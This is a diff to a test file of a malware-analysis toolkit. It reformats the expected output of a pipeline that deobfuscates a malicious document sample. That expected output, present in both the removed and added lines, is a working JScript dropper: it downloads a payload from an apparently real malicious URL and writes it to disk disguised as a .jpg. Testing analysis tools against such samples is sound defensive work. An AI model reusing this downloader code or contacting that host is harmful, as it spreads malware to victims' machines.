@@ -3,6 +3,7 @@ import json
 from .. import TestBase
 from io import BytesIO
 from hashlib import sha256
+from inspect import cleandoc
 
 from refinery.lib.loader import load_pipeline, load_detached as L
 
@@ -91,23 +92,28 @@ class TestGrabBagExamples(TestBase):
     def test_example_02_maldoc(self):
         data = self.download_sample('ee103f8d64cd8fa884ff6a041db2f7aa403c502f54e26337c606044c2f205394')
         pipeline = load_pipeline('doctxt | repl drp:c: | carve -s b64 | rev | b64 | rev | ppjscript')
-        self.assertEqual(str(data | pipeline), '\n'.join((
-            r'var girlLikeDoor = new ActiveXObject("msxml2.xmlhttp");',
-            r'girlLikeDoor.open("GET", "http://shoulderelliottd'
-                r'.com/boolk/QlaJk8C6vYqIyEwbdypBHv3yJR/wrWWNCD/77427/bebys8'
-                r'?cid=Bm9cAP&wP8zhkK=aNLC3bJChZM5GauIB&=S0MRS72jqtkORxKA3iUkjdS", false);',
-            r'girlLikeDoor.send();',
-            r'if (girlLikeDoor.status == 200) {',
-            r'    try {',
-            r'        var karolYouGirl = new ActiveXObject("adodb.stream");',
-            r'        karolYouGirl.open;',
-            r'        karolYouGirl.type = 1;',
-            r'        karolYouGirl.write(girlLikeDoor.responsebody);',
-            r'        karolYouGirl.savetofile("c:\\users\\public\\tubeGirlLoad.jpg", 2);',
-            r'        karolYouGirl.close;',
-            r'    } catch (e) {}',
-            r'}',
-        )))
+        goal = cleandoc(
+            r"""
+            var girlLikeDoor = new ActiveXObject("msxml2.xmlhttp");
+            girlLikeDoor.open(
+                "GET",
+                "http://shoulderelliottd.com/boolk/QlaJk8C6vYqIyEwbdypBHv3yJR/wrWWNCD/77427/bebys8?cid=Bm9cAP&wP8zhkK=aNLC3bJChZM5GauIB&=S0MRS72jqtkORxKA3iUkjdS",
+                false
+            );
+            girlLikeDoor.send();
+            if (girlLikeDoor.status == 200) {
+                try {
+                    var karolYouGirl = new ActiveXObject("adodb.stream");
+                    karolYouGirl.open;
+                    karolYouGirl.type = 1;
+                    karolYouGirl.write(girlLikeDoor.responsebody);
+                    karolYouGirl.savetofile("c:\\users\\public\\tubeGirlLoad.jpg", 2);
+                    karolYouGirl.close;
+                } catch (e) {}
+            }
+            """
+        )
+        self.assertEqual(data | pipeline | str, goal)
 
     def test_sockaddr_decoding(self):
         pipeline = load_pipeline(
